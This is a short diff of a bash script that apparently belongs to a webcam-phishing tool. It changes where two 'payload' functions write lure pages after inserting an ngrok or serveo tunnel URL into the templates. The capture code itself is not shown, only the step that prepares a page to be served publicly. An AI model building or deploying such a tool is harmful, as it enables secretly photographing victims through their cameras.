@@ -128,8 +128,8 @@ printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $s
 payload_ngrok() {
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-sed 's+forwarding_link+'$link'+g' grabcam.html > index2.html
-sed 's+forwarding_link+'$link'+g' template.php > index.php
+sed 's+forwarding_link+'$link'+g' /web/campret.html > /web/index2.html
+sed 's+forwarding_link+'$link'+g' /web/template.php > /web/index.php
 
 
 }
@@ -216,8 +216,8 @@ payload() {
 
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 
-sed 's+forwarding_link+'$send_link'+g' grabcam.html > index2.html
-sed 's+forwarding_link+'$send_link'+g' template.php > index.php
+sed 's+forwarding_link+'$send_link'+g' /web/campret.html > /web/index2.html
+sed 's+forwarding_link+'$send_link'+g' /web/template.php > /web/index.php
 
 
 }
